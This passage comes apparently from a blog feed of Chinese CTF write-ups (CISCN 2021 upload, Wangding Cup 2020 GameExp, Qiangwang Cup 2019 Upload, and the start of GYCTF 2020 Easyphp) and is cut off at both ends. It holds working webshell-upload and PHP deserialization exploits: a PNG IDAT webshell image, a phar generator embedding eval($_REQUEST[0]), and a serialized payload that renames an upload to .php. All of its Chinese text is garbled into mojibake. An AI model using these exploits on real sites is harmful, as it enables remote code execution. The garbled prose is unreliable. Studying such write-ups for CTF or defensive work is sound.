keyword">if</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">"zip"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token string">"éƒ½ä¸èƒ½è§£åŽ‹å‘¢"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"å¯ä»¥è§£åŽ‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ"</span><span class="token punctuation">;</span>    <span class="token variable">$pos_for_zip</span> <span class="token operator">=</span> <span class="token string">"/tmp/example/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token variable">$pos_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$zip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$name_for_zip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token string">"$pos_for_zip/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token function">imagesx</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">imagesy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$second</span> <span class="token operator">=</span> <span class="token function">imagecrop</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'x'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'y'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'width'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token string">'height'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$size</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$second</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$final_name</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">,</span> <span class="token string">'example/'</span><span class="token punctuation">.</span><span class="token variable">$final_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>ä¸ºäº†ç»•è¿‡å›¾ç‰‡æ£€æµ‹å¹¶å®žçŽ°æœ¨é©¬çš„å†™å…¥æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªè„šæœ¬ã€‚</p><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p><p>é¦–å…ˆè¦ä¿®æ”¹è„šæœ¬ä¸­çš„payloadã€‚</p><p><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p><p>å·¦ä¾§æ˜¯æœç´¢åŠŸèƒ½ï¼Œè¿™ä¸ªå›¾ç‰‡ç¼–ç å°±æŒ‰è¿™ä¹ˆä¸‰é¡¹æ¥å°±å¥½ã€‚<br><img src="/2021/09/06/ciscn-2021-upload/1.png" alt="image-20210907205659538"></p><p><img src="/2021/09/06/ciscn-2021-upload/2.png" alt="image-20210907170317139"></p><p>æŠŠåŽŸæ¥çš„æ”¹ä¸ºè¿™ä¸ª</p><p>a39f67641d201612546f112e29152b2167226b505050506f5f5310</p><p>ä¿®æ”¹è„šæœ¬é‡Œçš„è¿™ä¸¤ä¸ªåœ°æ–¹ï¼š</p><p><img src="/2021/09/06/ciscn-2021-upload/3.png" alt="image-20210907210012756"></p><p>ç”Ÿæˆa.pngæ–‡ä»¶</p><p><img src="/2021/09/06/ciscn-2021-upload/4.png" alt="image-20210907210040943"></p><p>ä¿®æ”¹å›¾ç‰‡åŽç¼€ä¸ºphpç„¶åŽåŽ‹ç¼©æˆzip</p><p>ç”ŸæˆHTMLæ–‡ä»¶å¹¶ç”¨æµè§ˆå™¨æ‰“å¼€</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;    &lt;title&gt;POSTæ•°æ®åŒ…POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="http://65540e4b-2909-440d-ad52-b4979373fc78.node4.buuoj.cn:81/upload.php?ctf=upload" method="post" enctype="multipart/form-data"&gt;&lt;!--é“¾æŽ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æŽ¥--&gt;    &lt;label for="file"&gt;æ–‡ä»¶åï¼š&lt;/label&gt;    &lt;input type="file" name="postedFile" id="postedFile"&gt;&lt;br&gt;    &lt;input type="submit" name="submit" value="æäº¤"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>ä¸Šä¼ æ–‡ä»¶å¹¶æŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åå¹¶æ·»åŠ é•¿åº¦ç»•è¿‡çš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/2021/09/06/ciscn-2021-upload/5.png" alt="image-20210907210431347"></p><p>è§£åŽ‹æ–‡ä»¶ï¼š</p><p><img src="/2021/09/06/ciscn-2021-upload/6.png" alt="image-20210907211238456"></p><p>èšå‰‘è¿žæŽ¥</p><pre><code>http://65540e4b-2909-440d-ad52-b4979373fc78.node4.buuoj.cn:81/example/a.php</code></pre><p><img src="/2021/09/06/ciscn-2021-upload/7.png" alt="image-20210907211444842"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯ï¼š2020-GameExp</title>
      <link href="2021/09/05/wang-ding-bei-2020-gameexp/"/>
      <url>2021/09/05/wang-ding-bei-2020-gameexp/</url>
      
        <content type="html"><![CDATA[<p>register.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "ok";'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">include_once</span> <span class="token string">"../sqlhelper.php"</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string">"../user.php"</span><span class="token punctuation">;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">sqlhelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span> <span class="token string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// èŽ·å–æ–‡ä»¶åŽç¼€å</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpg"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/x-png"</span><span class="token punctuation">)</span>            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// å°äºŽ 200 kb</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('æ–‡ä»¶å·²ç»å­˜åœ¨');&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>ç„¶åŽæ³¨å†Œé¡µé¢æœ‰ä¸ªå¤´åƒä¸Šä¼ çš„åŠŸèƒ½ï¼Œå¤§æ¦‚çŽ‡æ˜¯pharè§¦å‘è¿™ä¸ª<code>AnyClass</code>çš„<code>__destruct</code></p><p>æµç¨‹:<br>1.è¾“å…¥è½¬ä¹‰ï¼Œç™½åå•åŠ å¯†</p><p>2.è®¾ç½®ç™½åå•ï¼Œarray(â€œgifâ€, â€œjpegâ€, â€œjpgâ€, â€œpngâ€);</p><p>3.ä¸Šä¼ çš„æ–‡ä»¶æœ€ç»ˆæ–‡ä»¶å<code>filename</code>ä»¥<code>username.extension</code>æ–¹å¼å‘½å</p><p>4.<code>file_exists</code>æ£€æŸ¥<code>filename</code>æ˜¯å¦å­˜åœ¨ï¼Œå¯ä»¥è§¦å‘phar</p><p>åˆ°è¿™é‡Œæ€è·¯å¤§æ¦‚å°±å‡ºæ¥äº†ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œä¸Šä¼ æž„é€ çš„pharæ–‡ä»¶ï¼Œç„¶åŽå†åŽ»æ³¨å†Œé¡µé¢é‚£é‡Œï¼Œåˆ©ç”¨æ³¨å†Œï¼Œåœ¨<code>username</code>é‡Œé¢ä¼ <code>phar://***</code>ï¼ŒåŽé¢åœ¨è¿›è¡Œæ‹¼æŽ¥æ—¶ä¼šè®©<code>filename</code>å˜æˆ<code>phar://***.extension</code>ï¼Œå†ç”¨<code>file_exists</code>è§¦å‘phar</p><p>ç”Ÿæˆpharæ–‡ä»¶æ”¹å1.jpg</p><pre><code>&lt;?phpclass AnyClass{var $output = 'eval($_REQUEST[0]);';}@unlink("1.phar");$phar = new Phar("1.phar",0,'1.phar');$phar-&gt;startBuffering();$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //è®¾ç½®stubï¼Œå¢žåŠ gifæ–‡ä»¶å¤´$o = new AnyClass();$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest$phar-&gt;addFromString("test.jpg", "test"); //æ·»åŠ è¦åŽ‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p>æ³¨å†Œ</p><p><img src="/2021/09/05/wang-ding-bei-2020-gameexp/image-20210905010033047.png" alt="image-20210905010033047"></p><p>è®¿é—®login/H3ng.phpç¡®ä¿æ–‡ä»¶æˆåŠŸä¸Šä¼ </p><p><img src="/2021/09/05/wang-ding-bei-2020-gameexp/image-20210905010145382.png" alt="image-20210905010145382"></p><p>å†å›žåˆ°æ³¨å†Œé‚£ï¼Œ<code>username</code>å¡«<code>phar://H3ng</code>ï¼Œç”¨burpæŠ“åŒ…ï¼Œåœ¨Repeateré‚£é‡ŒGetä¼ å‚è¿›è¡Œå‘½ä»¤æ‰§è¡Œå³å¯</p><p><img src="/2021/09/05/wang-ding-bei-2020-gameexp/image-20210906042115649.png" alt="image-20210906042115649"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯ï¼š2019-Upload</title>
      <link href="2021/09/02/qiang-wang-bei-2019-upload/"/>
      <url>2021/09/02/qiang-wang-bei-2019-upload/</url>
      
        <content type="html"><![CDATA[<p>æ³¨å†Œç™»å½•</p><p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912162832458.png" alt="image-20210912162832458"></p><p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼š</p><p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912163550886.png" alt="image-20210912163550886"></p><p>base64è§£ç </p><p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912163619476.png" alt="image-20210912163619476"></p><p>è¿™é‡Œçœ‹å¾—åˆ°ä¸Šä¼ è·¯å¾„</p><p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912224136135.png" alt="image-20210912224136135"></p><pre><code>../upload/2b886493dfd70d92c76d86da48cf887d/10fb15c77258a991b0028080a64fb42d.png</code></pre><h5 id="tp5-application-web-controller"><a href="#tp5-application-web-controller" class="headerlink" title="tp5\application\web\controller"></a>tp5\application\web\controller</h5><p><img src="/2021/09/02/qiang-wang-bei-2019-upload/image-20210912223129146.png" alt="image-20210912223129146"></p><h5 id="proflie-php"><a href="#proflie-php" class="headerlink" title="proflie.php"></a>proflie.php</h5><pre><code>TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjc4OiIuL3VwbG9hZC8yYjg4NjQ5M2RmZDcwZDkyYzc2ZDg2ZGE0OGNmODg3ZC8xMGZiMTVjNzcyNThhOTkxYjAwMjgwODBhNjRmYjQyZC5wbmciO3M6ODoiZmlsZW5hbWUiO3M6Nzg6Ii4vdXBsb2FkLzJiODg2NDkzZGZkNzBkOTJjNzZkODZkYTQ4Y2Y4ODdkLzEwZmIxNWM3NzI1OGE5OTFiMDAyODA4MGE2NGZiNDJkLnBocCI7czoxMToidXBsb2FkX21lbnUiO047czozOiJleHQiO3M6MzoicG5nIjtzOjM6ImltZyI7czoxMDoidXBsb2FkX2ltZyI7czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czozOiJpbWciO319czo4OiJyZWdpc3RlZCI7YjowO30%3D</code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class=" language-PHP"><code class="language-PHP"><?phpnamespace app\web\controller;error_reporting(0);class Profile{    public $checker;    public $filename_tmp;    public $filename;    public $upload_menu;    public $ext;    public $img;    public $except;    public function __get($name)    {        return $this->except[$name];    }    public function __call($name, $arguments)    {        if($this->{$name}){            $this->{$this->{$name}}($arguments);        }    }}class Register{    public $checker;    public $registed;    public function __destruct()    {        if(!$this->registed){            $this->checker->index();        }    }}$profile = new Profile();$profile->except = ['index' => 'img'];$profile->img = "upload_img";$profile->ext = "png";$profile->filename_tmp = "./upload/2b886493dfd70d92c76d86da48cf887d/10fb15c77258a991b0028080a64fb42d.png";$profile->filename = "./upload/2b886493dfd70d92c76d86da48cf887d/10fb15c77258a991b0028080a64fb42d.php";$register = new Register();$register->registed = false;$register->checker = $profile;echo urlencode(base64_encode(serialize($register)));</code></pre><p>ç„¶åŽèšå‰‘è¿žæŽ¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GYCTFï¼š2020-Easyphp</title>
      <link href="2021/09/01/gyctf-2020-easyphp/"/>
      <url>2021/09/01/gyctf-2020-easyphp/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.zipæºç æ³„éœ²/">www.zipæºç æ³„éœ²</a></p><h5 id="lib-php"><a href="#lib-php" class="headerlink" title="lib.php"></a>lib.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$array</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'union'</span><span class="token punctuation">,</span><span class="token string">'regexp'</span><span class="token punctuation">,</span><span class="token string">'load'</span><span class="token punctuation">,</span><span class="token string">'into'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'insert'</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"ä½ çš„IDæ˜¯"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"ä½ å¥½ï¼"</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$Info</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">;</span>        <span class="token variable">$updateAction</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$Info</span><span class="token punctuation">,</span><span class="token string">"update user SET age=$age,nickname=$nickname where id="</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 